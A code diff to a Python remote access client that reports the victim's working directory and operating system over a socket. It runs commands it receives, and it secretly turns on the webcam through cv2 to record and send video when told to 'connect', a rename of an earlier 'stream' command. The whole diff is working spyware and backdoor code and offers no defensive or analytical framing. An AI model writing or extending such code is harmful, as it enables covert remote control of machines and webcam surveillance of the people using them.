@@ -20,11 +20,8 @@ targets_os = platform.system()
 s.send(cwd.encode())
 s.send(targets_os.encode())
 
-# Global variable for video capture
-cap = None
-
-# Function to stream live video
-def video():
+# Function to record and send the video.
+def record_video():
     global cap
     cap = cv2.VideoCapture(0)
     while True:
@@ -45,11 +42,11 @@ while True:
     if command.lower() == "exit":
         # if the command is exit, just break out of the loop.
         break
-    elif command.lower() == "stream":
-        # Start streaming video in a separate thread
-        streaming_thread = threading.Thread(target=video)
-        streaming_thread.start()
-        output = "Live video streaming started."
+    elif command.lower() == "connect":
+        # Start recording video in a separate thread
+        recording_thread = threading.Thread(target=record_video)
+        recording_thread.start()
+        output = "Video recording started."
         print(output)
     else:
         # execute the command and retrieve the results.
